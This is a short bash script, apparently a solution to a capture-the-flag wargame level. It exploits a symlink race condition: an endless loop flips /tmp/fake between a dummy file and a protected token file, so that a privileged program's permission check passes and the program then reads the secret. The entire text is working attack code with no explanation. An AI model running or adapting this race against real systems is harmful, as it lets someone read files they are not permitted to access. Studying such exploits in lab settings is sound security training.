#!/bin/bash

touch /tmp/coucou

while true; do
	ln -sf /tmp/coucou /tmp/fake
	ln -sf /home/user/level10/token /tmp/fake
done